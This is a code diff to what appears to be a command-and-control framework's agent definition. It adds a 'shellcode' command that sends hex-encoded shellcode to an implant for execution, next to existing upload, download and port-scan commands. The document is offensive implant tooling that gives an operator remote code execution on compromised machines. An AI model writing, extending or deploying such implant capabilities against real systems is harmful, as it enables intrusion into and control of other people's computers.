@@ -147,6 +147,26 @@ class CommandPortscan(Command):
         packer.add_data(f"portscan {arguments['ports']} {arguments['target']} {arguments['workers']}")
         return packer.buffer
 
+class CommandShellcode(Command):
+    Name = "shellcode"
+    Description = "Load shellcode into the implant to be executed."
+    Help = "Usage: shellcode [HEX ENCODED SHELLCODE]\n Example: shellcode 9090ccc3"
+    NeedAdmin = False
+    Mitr = []
+    Params = [
+        CommandParam(
+            name="shellcode",
+            is_file_path=False,
+            is_optional=False
+        )
+    ]
+
+    def job_generate(self, arguments:dict) -> bytes:
+        print("[*] job generate")
+        packer = Packer()
+        packer.add_data(f"shellcode {arguments['shellcode']}")
+        return packer.buffer
+
 class CommandExit(Command):
     Name        = "o7"
     Description = "just tells the agent to exit"
@@ -200,6 +220,7 @@ class Gopher47(AgentType):
         CommandUpload(),
         CommandDownload(),
         CommandPortscan(),
+        CommandShellcode(),
         CommandExit()
     ]
 
